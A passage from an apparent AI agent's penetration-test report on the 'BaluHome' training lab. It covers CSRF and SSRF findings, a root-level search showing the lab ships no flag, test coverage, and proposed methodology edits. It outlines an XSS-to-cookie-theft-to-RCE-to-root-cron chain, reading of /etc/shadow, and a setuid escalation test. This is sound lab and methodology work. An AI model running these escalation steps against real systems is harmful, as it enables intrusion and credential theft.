Every state-changing route (`/upload`, `/video/:id/subtitles`, `/video/:id/like`, `/messages/:userId`, `/admin/thumbnails/:videoId`) takes no anti-CSRF token. `SameSite=Lax` on the session cookie (`server.js:73`) blocks the cookie on cross-site `POST`, so the practical exposure is much smaller than the missing token suggests — and reporting it as a live CSRF vulnerability would be the overclaim. It is listed as defence-in-depth: `Lax` is a browser default that a client can be talked out of, and the admin-only upload route is exactly the one where a cross-site request would be most valuable.

### 8.5 The bot will fetch any URL it is sent (CWE-918)

`extractUrls` in `bot/admin-bot.js:36-49` accepts any `http`/`https` URL from a message to the admin and navigates to it, with no host allowlist. The bot runs in the same network namespace as the application, so an unprivileged user can make a privileged browser request internal addresses, carrying the admin's session cookie to whatever host it is told. The chain uses this exactly as intended, which is why it is a finding rather than a mechanism: the *delivery* of the payload and an *arbitrary-request* primitive are the same code path, and closing the XSS would leave the SSRF.

---

## 9. Reward: there is none, and here is the evidence

`decision-making.md` requires that a closed target states what was not obtained and why nothing was invented to fill the gap. BaluHome ships **no flag, no reward string, and no success endpoint.** The hunt was run as `root` and covered the filesystem, the database, the process environment, and the application code.

**Filesystem** — no `FLAG{`, `flag{`, `CTF{` or reward marker anywhere, and no file named like one:

```
$ grep -rIlE 'FLAG\{|flag\{|CTF\{|REWARD|reward' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=node_modules
/var/log/balutube-backup.log        <- my own payload text
/tmp/hunt.sh                        <- my own payload
/app/uploads/thumbnails/custom/thumb-13-....js   <- my own payload
/app/uploads/videos/hunt.txt        <- my own output

$ find / -xdev \( -iname '*flag*' -o -iname '*reward*' -o -iname '*proof*' \) -not -path '*/node_modules/*'
/usr/local/include/node/cppgp/internal/atomic-entry-flag.h    <- an unrelated Node header
```

**Database** — every table and row count. No reward table, no secret column:

```
  users                  7
  videos                 13
  subtitles              1
  comments               4
  likes                  0
  subscriptions          6
  messages               1
  collected_cookies      2
```

**Configuration and process state** — nothing:

```
$ cat /app/.env
  (no /app/.env file)
$ env | grep -iE 'flag|reward|secret|token'
  (none in www-data env)
$ tr '\0' '\n' < /proc/1/environ | grep -iE 'flag|reward|secret|token|base_url'
  (none)
```

**Application code** — no congratulation route, view, or string:

```
$ grep -rniE 'congratul|has ganado|flag|reward|exito|éxito|winner' app/routes app/views
  (no matches)
```

The reward for this lab is the root compromise itself, which the image's `README.md:168` states as the chain's endpoint: *"register → subtitle XSS → cookie stolen by the admin bot → admin takeover → `shell.js` upload as thumbnail → RCE as `www-data` on video visit → `su balutin` → `backup.sh` edit → root cron → `euid=0`."* I reached `uid=0(root)` and verified it by reading `/root` and `/etc/shadow`, so the lab's stated success condition is met. **There is no string to submit, and none was invented.**

---

## 10. Tested / not tested / could not test

**Tested, with evidence**
- Full port surface (`nmap -sV -Pn -p-`) — one port.
- Anonymous and low-privilege access control on all five protected routes, positive and negative.
- Unrestricted upload on the video path, extension preservation, and the served `Content-Type`.
- Thumbnail `fileFilter` bypass by declared MIME type; extension preserved; `require()` sink.
- Identity of the code-execution primitive, measured at first use.
- Session cookie attributes; session secret by signature recomputation, on my own and the admin's cookie.
- Admin bot delivery of both an uploaded-file URL and (by construction) the message XSS path.
- Weak-password escalation, group membership, and the root cron escalation, each with a control.
- The setuid question, to a root cause, with five hypotheses tested and four rejected.
- Reward absence: filesystem, database, environment, application code.
- Artifact cleanup, verified by md5 against the pristine image copy.

**Not tested — reachable, deliberately not pursued**
- Brute force or spraying against `/login` beyond one request per known account (§8.3 established the control's absence without needing volume).
- The `VULN #3` message-body XSS as an end-to-end delivery — its sink is confirmed in source and its delivery mechanism is the same bot code path proven in §5.3, so executing it a second time would add a duplicate row and no new information.
- `sqlite_master` inspection for triggers or views beyond `type='table'`.
- Whether the SQLite `-wal`/`-shm` sidecars leak anything the main file does not; irrelevant here, as the database is not part of the chain and I already had root.

**Could not test**
- Whether the app behaves differently with a populated `.env` (`INSECURE_COOKIES=false`, a rotated `SESSION_SECRET`). The lab ships no `.env`, and inventing one would test a configuration the author did not deploy. This is the single most interesting untested variant: with `INSECURE_COOKIES=false` the cookie theft chain should fail at step 5, and the author's own remediation claim is untested by anyone who has not tried it.
- Persistence across a container restart. The bot's `MemoryStore` sessions and the setuid artifacts do not survive; the intended-state question (does the chain still work from a cold container?) is answerable only by rebuilding, which I judged not worth 1 GB of transfer for a lab already solved.
- Whether the setuid-shell recipe behaves differently on a host whose `/bin/sh` is neither bash nor dash. The finding in §6.4 is scoped to this image.

---

## 11. Design observation — the most valuable finding was in the lab's own documentation

Ranked by what an assessor would actually act on, this lab's findings are not the four it advertises. In order:

1. **The documented final escalation step cannot work on the image that ships it** (§6.4). A reader following the README literally reaches a setuid root shell, gets `uid=33(www-data)`, and concludes the lab is broken. The escalation is real and I proved it — but by a different mechanism than the one documented. A training target whose own instructions contain an impossible step teaches the reader to distrust the instructions, which is the opposite of the intent.
2. **The unlabeled in-origin upload XSS** (§3). Shorter than the designed path, needs a different mental model (the browser is the interpreter), and would survive a fix for all four labeled bugs.
3. **The hardcoded default session secret** (§4.2). Not in the README, latent today, catastrophic after the store moves.
4. The four labeled vulnerabilities, which are well-constructed and, notably, come with correct controls attached (§2, §5.3).

The deeper pattern is about the pilot rather than this lab, and it is why the fifth repetition is worth more than the first four. **Every lab in this series shipped a spoiler, and in every case the spoiler was strictly smaller than the target.** Asturias labelled the CWE but not the middleware registration order. Acme labelled the banner but not the `777` document root. Zabbixploit named `EnableRemoteCommands=1` and shipped a working allowlist nobody would guess to look for. BaluHome shipped a complete attack chain and still left an unlabelled upload path, an unlabelled hardcoded secret, and a documented escalation step that does not work.

A lab author who labels their own bugs has made a deliberate trade: they have optimised for the learner *reaching* the bug and accepted a cost in the learner's *reasoning*. BaluHome's author went furthest — a 223-line design document — and drew the line in a genuinely thoughtful place, keeping every hint out of the rendered interface and shipping the documentation on the filesystem. That is careful work. It is also, precisely, the failure mode `decision-making.md` §7 was written about, at its largest: **the moment the answer is written down, the feeling that work remains disappears, and nothing downstream can detect the difference, because a lab that hands you the answer and a lab that makes you find it produce the same green checkmark.** The finding that mattered most in this engagement was not in the target's request handler at all — it was in the space between what the documentation promised and what the image did.

---

## 12. Methodology integration — what was added, what was refused as redundant, and one proposal

I read all ~15 existing oracles in `sections/api_web.md:260-300` and the `## CI/CD Runners` prose section in `sections/infrastructure.md` before writing anything. Three of this lab's classes were **already covered and were deliberately not re-added**:

| This lab's finding | Existing oracle | Decision |
|---|---|---|
| Thumbnail `fileFilter` reads `file.mimetype` (CWE-434) | `api_web.md` — "the multipart `Content-Type` is a client header… a `fileFilter` that reads `file.mimetype` validates a *declaration*, never the bytes" | **Already there, verbatim.** Not duplicated. |
| `require()` on an uploaded file → RCE, admin-gated upload with a public trigger (CWE-95) | `api_web.md` — "'Executes when served' oracle", including the `delete require.cache` idempotence note and the "trigger route may be public even when the upload route is not" rule | **Already there.** Not duplicated. |
| `/collect` unauthenticated, load-bearing for the chain (CWE-306) | `api_web.md` — "An unauthenticated endpoint used in the chain is an independent finding", plus `decision-making.md` §5 | **Already there.** Not duplicated. |
| Group-writable root-executed script → root (CWE-732) | `infrastructure.md` `## CI/CD Runners` — "The group bit decides *who may plant* the payload, and the runner's uid decides *who runs* it — two different principals, and only the second one matters" | **Class already there.** Not duplicated. |

Adding a fifth restatement of "a filter that reads the client's declared type proves nothing" would have made the section longer and no safer. Density beats repetition.

### Added — three edits, all extensions of existing oracles, no new class and no new section

1. **`api_web.md`, upload oracle — a fourth axis (d).** The existing oracle asks three questions, all of them about *server-side* handling: was it accepted, with which extension, under the document root. None of them asks what the **browser** will do with the result. I added axis (d) — does the static mount serve it as an *active* content type in the app's own origin — with the `express.static` mechanism, the extension list, and the verified BaluHome pair. Rationale: axes (a)–(c) cannot distinguish "stored as an inert asset under the docroot" from "served back as a document the browser executes", and that difference is the whole finding. I also generalised the scope from image uploads to *every* save handler in the app, since the video endpoint had no filter at all.
2. **`api_web.md`, new bullet — rate an XSS by the cookie attributes, not by the payload.** `httpOnly` appeared in the repository only as a bare checklist item (`api_web.md:106`, `infrastructure.md:214`) with no rule attached. The new bullet makes the missing rule explicit: `httpOnly` present means origin-bound actions, absent means a portable credential, and that single attribute is the difference between two ratings for one payload. It also states the two attributes that must *not* be overclaimed (`SameSite=Lax` downgrades missing-CSRF to defence-in-depth; absent `Secure` on plain HTTP is a note).
3. **`api_web.md`, new bullet — the session-secret signature oracle, with its two traps.** No oracle existed for hardcoded session material; the only mention in the repo was `ai_llm.md:691`, an LLM-prompt artifact rather than a technique. The bullet is the one-request test (recompute the signature over a cookie the server issued) and it carries both corrections from §0.2 and §9 of this engagement: compare programmatically because partial agreement means your transcription is wrong, and read the *deployed* configuration rather than the `.env.example` that the repository ships to look authoritative.

### Proposed, not written — a new section is needed and I did not create it

**Proposal for `sections/infrastructure.md`: a prose section `## Setuid and Trusted Executors`,** in the same style as `## CI/CD Runners` and `## Monitoring Agents` (both of which exist precisely because their class had no home in a tool list). The class has **no oracle anywhere in the repository** — `setuid`/`suid`/`euid` appear only as bare wordlist bullets under `### SUID` in the Linux privilege-escalation lists (`infrastructure.md:1074`, `:1101`), with no rule attached. The rule I would write, and the reason it earns a section:

> **A setuid *interpreter* discards the privilege you planted; a setuid *binary* keeps it — so escalate by making the trusted principal execute your command, not by hunting for a setuid shell.** Localise the failure before concluding the container blocked you: test a non-interpreter (`cp /usr/bin/id /tmp/x && chmod u+s /tmp/x`) before blaming `nosuid`, `no-new-privileges`, `CAP_SETUID` in the bounding set, or seccomp. A shell refuses an elevated effective uid at startup by design, and both `bash` and `dash` do it independently. Corollary for reports: when a target's own documentation prescribes a setuid shell, verify the step and report the recipe as broken **separately** from the escalation, which is usually still real by another route.

Two supporting notes for whoever writes it. First, the escalation here never needed setuid at all: the group-writable root-executed script gave direct root command execution, which is strictly stronger. The useful framing is therefore *"prefer the trusted principal's own execution over a setuid artifact"*, with setuid as the fallback whose failure mode you must be able to explain. Second, the narrow precision that made the finding defensible: the group grant was on the **file** (`-rwxrwx--- root mantenimiento`) and not on its **directory** (`drwxr-xr-x root root`), so `>>` and truncate-and-write worked while `sed -i` failed. A report saying "the group owns the directory" would overstate it — which is the §7 rule (a name or mode that looks worse than the fact) applied to a permission bit.

I am not creating this section, per the standing instruction to propose rather than create. It is the one thing in this engagement I would add if asked.
